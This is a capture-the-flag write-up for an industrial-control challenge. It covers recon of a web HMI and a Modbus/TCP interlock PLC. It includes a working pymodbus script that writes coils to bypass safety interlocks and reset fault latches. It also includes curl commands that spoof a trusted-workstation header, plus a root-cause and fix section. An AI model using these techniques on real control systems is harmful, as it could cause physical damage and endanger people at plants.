---
title: Ash-Vault Interlock
summary: Drive a Modbus/TCP interlock PLC and its HMI to halt an unstable cycle, force the seal-ready state, and release the checkpoint token from the alarm table.
date: 2026-07-31
tags: [Hack The Box, Cyber Apocalypse 2026, ICS]
difficulty: hard
os: N/A
---

# Ash-Vault Interlock (Hard) - OT/ICS Writeup

## Challenge
Stormbound engineers reached the lower Crownspire brineworks after alarms echoed through the Ash Vault tunnels. The old seal is still guarded by a forgotten HMI and interlock PLC. The PLC exposes a Modbus/TCP control surface alongside the HMI, so players must recover enough process and ladder-logic context to operate it safely. Regain enough control to stop the unstable automatic cycle, manipulate the brine process into the seal-ready state, and trigger the final seal alarm that reveals the checkpoint token in the alarm table.

**Targets:**
- `154.57.164.66:30460`, Modbus/TCP asset (Asterion AVX-470 Interlock PLC)
- `154.57.164.66:31774`, web HMI

*(ports are per-instance and change on redeploy, this challenge took 4 instances to finish)*

## Flag

```
||HTB{4sh_v4ult_1nt3rl0ck_s3aled_4********************************||
```

---

## Part 1: Recon

The HMI renders brine vessel V-204 with FV101 (brine feed), DV201 (drain header), PV301 (vent stack), P401 (recirc pump) and a locked ASH-VAULT seal gate. Initial state: mode AUTO, LT204 100.0%, PT301 76.6 kPa, `PT301_HI_LATCH` active, `SEAL ALARM clear`, stable scans 0/10.

`/static/hmi.js` gives up the compressed status schema:

```
m = mode
p = [level%, pressure_kPa, auto_raw%, feed, drain, vent, recirc, motor_A, vib, temp_C, agitation]
o = [inlet_open, drain_open, vent_open, recirc_pump_running, seal_commanded]
s = [manual_active, pressure_hi_latch, reset_permissive, seal_stable_window,
     lt204_stuck_low, seal_token_alarm_active, bad_sequence_latch]
t = [seal_stable_scans, last_trip_code, plc_scan_counter]
```

It also contains two constants that are defined, exported on `window.ashVaultClient`, and **never used in any fetch call**:

```js
const ENGINEERING_SOURCE_HEADER = "X-Engineering-Station";
const TRUSTED_ENGINEERING_STATION = "AVX-EWS-01";
```

I noted this as suspicious early on and then spent an hour failing to find where it applied. It turned out to be the answer to both halves of the challenge. Lesson: when a challenge hands you an unused credential, find its consumer *before* brute-forcing the process.

The `drawGauge` calls also encode the safe bands, which I did not read carefully enough at first and paid for later:

```js
drawGauge(..., level,    0, 100, 18, 92, "LT204 LEVEL", "%")     // green 18-92 %
drawGauge(..., pressure, 0, 120,  0, 72, "PT301 PRESSURE", " kPa") // green 0-72 kPa
```

Modbus enumeration established the surface: unit ID **1** only (0-255 scanned), function codes 1/2/3/4/5/6/15/16, no vendor-specific codes, coils 0-63, registers 0-159 read-only.

---

## Part 2: The blind-probing phase (and how it went wrong)

With no ladder logic yet, I mapped coils by toggling them and diffing `/status.json`. This produced two confirmed facts and one very costly wrong conclusion.

**Confirmed immediately:**
- `coil[0]=False` stops AUTO, mode goes IDLE, all four outputs de-energise, pressure begins bleeding down
- `coil[7]=True` sets `seal_commanded` and produces "Seal command waiting for stable interlock window"

**The trap:** toggling `coil[6]` latched `Bad sequence latch active` and moved the trip code 201 -> 310. It never cleared. I tested all 16 coils, then all 64, in AUTO, IDLE and MANUAL, and nothing unlatched it.

I misread this as "coil 6 is the manual-mode request and I fired it out of order." Both halves were wrong. This cost the first two instances.

**What actually saved the mapping** was re-testing coils *after* stopping AUTO. Nothing responds while the auto sequencer is driving the outputs, which is why the first sweep in AUTO showed nothing:

| Coil | Function | Only discoverable after AUTO stopped |
|------|----------|--------------------------------------|
| 0 | AUTO_ENABLE | no |
| 1 | **MANUAL_ARM** | **yes** |
| 2 | FV101 inlet | yes |
| 3 | DV201 drain | yes |
| 4 | PV301 vent | yes |
| 5 | P401 recirc | yes |
| 6 | RESET pulse | (traps if fired without permissive) |
| 7 | ASH_VAULT_SEAL_CMD | no |

`coil[1]`, not `coil[6]`, is manual mode. Writing it from IDLE transitions cleanly to MANUAL with no fault.

**Instances burned:** 3, all to `bad_sequence_latch`. Each time the trigger was different and I only understood why after reading the ladder.

---

## Part 3: Dead ends, in order

Documenting these because they consumed the bulk of the session and each one *looked* correct at the time.

**1. "lt204_stuck_low is the blocker."** With everything else green, `s[4]` stayed true and `seal_stable_window` stayed false, so I assumed it was the gate. `LT204_AUTO_RAW` reads exactly 12.0% forever. I tried:

- draining to exactly 12% to make the real level agree with the frozen reading
- emptying the vessel to 0.00% and refilling from empty (a frozen transmitter often re-samples when crossing its stuck value)
- crossing 12% in both directions
- running AUTO for 20+ seconds so the auto channel could re-sample
- a 40-scan / 80-second soak with the seal armed
- flow-through cooling with feed and drain both open, on the theory that temperature was involved

It never moved once, under any condition. **It is a red herring by design.** RUNG 004 shows it only feeds `FV101_AUTO_DEMAND`, which is *why* the auto cycle runs away, and it appears in no seal-window condition. The amber indicator on the HMI is describing the fault that broke the plant, not a gate you must clear.

**2. The writable register block.** Sweeping writes across all 160 registers found addresses **20-31 writable** while everything else rejects with exception 3. A 12-register block that persists values but produces no observable effect looked exactly like the medium challenge's 8-byte maintenance-unlock key. I tried `AVX-EWS-01` in three ASCII packings, the alarm code 900, `0xFFFF`, and single-value writes to every address. Inert scratch space, pure rabbit hole.

**3. Custom Modbus function codes.** The medium challenge (Crownspire Transfer) used a vendor-specific Type 104 ASDU for its maintenance unlock, so I probed function codes 1-30, 43, 65-75 and 100-110 expecting an analogous AVX handoff. Only the standard eight are implemented.

**4. Other unit IDs.** Scanned 0-255 looking for an engineering slave. Only unit 1 exists.

**5. `/login`.** Discovered at `/login`, and its text is a deliberate taunt: *"LDAP bridge unavailable. Local engineering workstation trust remains enabled for AVX handoff."* It returns **401 unconditionally**, tested against 11 header-name variants, IP-spoofing headers (`X-Forwarded-For`, `X-Real-IP`, `X-Originating-IP`, `X-Client-IP`), every HTTP verb, and station names in the form fields. It is a decoy whose only job is to point you at the trust path.

**6. Host port scan.** Scanning 30000-32767 returned ~32 open ports, which are **other tenants' challenge instances** on the shared node, not part of this challenge. Not probed further. Worth noting so nobody wastes time on them, or worse, touches someone else's box.

**7. Coils 16-63 and the reset coil as an ack.** After the seal was made I swept all remaining coils and pulsed `coil[6]` looking for an alarm acknowledge. Nothing.

---

## Part 4: The breakthrough

Two things unlocked it, in this order.

**Reading the gauge bands off the screenshot.** With the vessel drained to 11.6% chasing the stuck-sensor theory, the LT204 needle was sitting in the **red**. The gauge definition in `hmi.js` says green is 18-92%. The sensor-agreement theory was not just unproven, it was actively driving the process out of range.

**Endpoint brute-forcing with the engineering header attached.** Running a wordlist against the HMI *with* `X-Engineering-Station: AVX-EWS-01` set surfaced **`/ladder.txt`**. The same request without the header returns:

```json
{"error": "engineering document access denied",
 "details": ["HMI request trust header rejected",
             "engineering workstation source validation failed"]}
```

That is the entire challenge in one detail: the header gates content, and I had been fetching everything without it. Had I tried the unused constant against arbitrary paths on hour one instead of hour three, this would have been a short challenge.

```bash
curl -H "X-Engineering-Station: AVX-EWS-01" \
     -H "X-Requested-With: AVX-HMI" \
     http://<hmi>/ladder.txt
```

---

## Part 5: The ladder logic

The export hands over the complete coil map and every threshold.

```
C00000 AUTO_ENABLE                 C00004 PV301_VENT_OPEN_CMD
C00001 MANUAL_ARM                  C00005 P401_RECIRC_PUMP_CMD
C00002 FV101_INLET_OPEN_CMD        C00006 RESET_PRESSURE_LATCH_PULSE
C00003 DV201_DRAIN_OPEN_CMD        C00007 ASH_VAULT_SEAL_CMD
```

**RUNG 020, fault latches.** Explains all three of my bad-sequence trips:

```
GEQ PT301_PRESSURE_KPA 72.0 --------------------------(OTL) PRESSURE_HI_LATCH
--| |-- C00007 SEAL_CMD --| |-- PRESSURE_HI_LATCH ----(OTL) BAD_SEQUENCE_LATCH
--| |-- C00007 SEAL_CMD --|/|-- MANUAL_ACTIVE --------(OTL) BAD_SEQUENCE_LATCH
```

Commanding the seal while the pressure latch is set, or while not in manual, latches the fault.

**RUNG 030, reset permissive.** Every condition simultaneously:

```
MANUAL_ACTIVE, FV101 closed, DV201 closed, PV301 closed, P401 running,
LIM 22.0 <= PT301 <= 45.0, LIM 35.0 <= LT204 <= 65.0
```

**All three valves must be shut with the pump running.** This is why the latch looked permanently unclearable, I was always venting to keep pressure down, which holds PV301 open and blocks the permissive. The one time it did go true earlier in the session was the one time I happened to have everything closed, and I did not notice the correlation.

**RUNG 044, latch reset.** `C00006` pulsed **with** the permissive unlatches both latches and zeroes the trip code. Pulsed **without** it, it latches `BAD_SEQUENCE_LATCH` and writes trip code 310. That is the trap, and it is specifically designed to punish blind coil-poking. Every one of my 310s came from here.

**RUNG 052, seal window.** Manual active, both latches clear, seal commanded, all three valves closed, pump running, and:

```
LIM 28.0 <= PT301_PRESSURE_KPA <= 36.0
LIM 38.0 <= LT204_LEVEL_PCT   <= 54.0
```

The pressure band is narrow and, crucially, has a **lower** bound of 28 kPa. Every soak I ran sat at 13.6 kPa with the vent open, which is *below* the window. I had been holding the process in a state that could never satisfy it while blaming the level sensor.

**RUNG 054/055.** A CTU with preset 10 counts consecutive in-window scans, then latches `AVX900_SEAL_TOKEN_ALARM`.

---

## Part 6: Exploitation

```python
from pymodbus.client import ModbusTcpClient
c = ModbusTcpClient(HOST, port=ASSET_PORT, timeout=5); c.connect()

# 1. stop the unstable auto cycle  -> mode IDLE, outputs de-energised
c.write_coil(0, False, device_id=1)

# 2. arm manual                    -> mode MANUAL, MANUAL_ACTIVE set
c.write_coil(1, True, device_id=1)

# 3. drive level into 38-54 %, vent open while filling so PT301 stays < 72
c.write_coil(4, True,  device_id=1)   # vent open
c.write_coil(2, True,  device_id=1)   # feed open -> close at ~45 %
c.write_coil(5, True,  device_id=1)   # recirc pump running

# 4. go quiescent: every valve shut, pump running
c.write_coil(2, False, device_id=1)
c.write_coil(3, False, device_id=1)
c.write_coil(4, False, device_id=1)   # vent CLOSED -> pressure settles into 22-45

# 5. once s[2] RESET_PERMISSIVE is true, pulse the reset
c.write_coil(6, True, device_id=1); c.write_coil(6, False, device_id=1)
#    -> both latches unlatched, trip code 0, "No active alarms"

# 6. command the seal with level 38-54 and pressure 28-36
c.write_coil(7, True, device_id=1)
```

Closing the vent is the move that makes it work. It satisfies the "all valves closed" contact in both RUNG 030 and RUNG 052, and lets the recirc pump settle pressure up into the 28-36 band on its own. Venting was the single habit keeping me out of the window all session.

```
t=0.0s lvl=45.0% press=28.1 stable=1/10  s=[T,F,T,T,T,F,F]
t=1.8s lvl=45.0% press=30.2 stable=3/10
t=3.6s lvl=45.0% press=31.2 stable=5/10
t=5.4s lvl=45.0% press=31.6 stable=7/10
t=7.2s lvl=45.0% press=31.8 stable=9/10
t=9.0s lvl=45.0% press=31.9 stable=11/10 -> AVX900 ASH-VAULT SEAL MADE - ENGINEERING ACK REQUIRED
```

---

## Part 7: Flag recovery

The alarm withholds the token behind "ENGINEERING ACK REQUIRED". The ack is not a coil, not a register write, and not the `/login` form. It is the same trust header that unlocked the ladder export:

```bash
curl -H "X-Engineering-Station: AVX-EWS-01" \
     -H "X-Requested-With: AVX-HMI" \
     http://<hmi>/alarms
```

```
AVX900 ASH-VAULT SEAL MADE - TOKEN ||HTB{4sh_v4ult_1nt3rl0ck_s3aled_4********************************||
```

The exact same `/alarms` request without the header still returns "ENGINEERING ACK REQUIRED", which is what made this so easy to walk past.

---

## What I would do differently

1. **Chase the unused credential first.** `TRUSTED_ENGINEERING_STATION` was visible in minute five and gated both `/ladder.txt` and the token. Grep client-side JS for constants that are declared but never called, then try them against every endpoint before touching the process.
2. **Brute-force endpoints with candidate auth already applied.** My first sweep found only `/`, `/status.json`, `/alarms`, `/static/hmi.js`, `/login`, because I ran it *without* the header. `/ladder.txt` was there the whole time, returning an access-denied JSON that a 404-only filter hid from me.
3. **Read the HMI's own rendering code for thresholds.** The green bands were in `drawGauge` from the start.
4. **Stop the auto sequencer before mapping anything.** No output coil responds while AUTO is driving, which makes an early sweep look like dead address space and sent me down the "coil 6 is manual" path.
5. **Treat a persistent flag that never changes under any stimulus as scenery.** After the drain-to-zero test proved `lt204_stuck_low` immovable, I should have inverted the assumption and asked what the seal window *actually* reads, rather than continuing to attack the sensor.
6. **Vary the whole state vector, not one axis.** I held vent-open across nearly every experiment because it kept pressure comfortably low, which silently violated a contact in two separate rungs and pinned pressure below the window's lower bound.

---

## Root Cause / Fix

- **Header-based authorisation.** Engineering document access and alarm-token disclosure are gated by a client-supplied header naming a trusted workstation. Any client can assert it, and the trusted value ships in JavaScript to every visitor. Source identity must come from mutual TLS or a signed session, and secrets must never ship in client code.
- **Unauthenticated Modbus write access.** Every safety-relevant coil, mode arbitration, all four field devices, the latch reset and the seal command, is writable by anyone who can reach the port, with no authentication or source restriction. Modbus/TCP has no native security and belongs behind a segmented network and a protocol-aware gateway enforcing read-only access for untrusted sources.
- **Safety interlocks in soft logic only.** The seal permissive, pressure trip and sequence latches all live in the same program an attacker drives through its own command coils. Protective functions belong in an independent SIS or protection relay unreachable over the operational channel.
- **Ladder export served by the HMI.** Publishing the control program from the operator interface hands over the complete tag map and every interlock threshold. Engineering artefacts do not belong on an operator-facing web server, header-gated or not.
- **Faulted instrument left in service.** `LT204_AUTO_RAW` had been frozen at 12.0% long enough to drive a runaway fill via `FV101_AUTO_DEMAND`, and the PLC kept executing the auto cycle regardless. A plausibility fault (RUNG 004 already computes `LT204_SPLIT_RANGE_FAULT`) should force a safe-state transition, not degraded automatic operation.
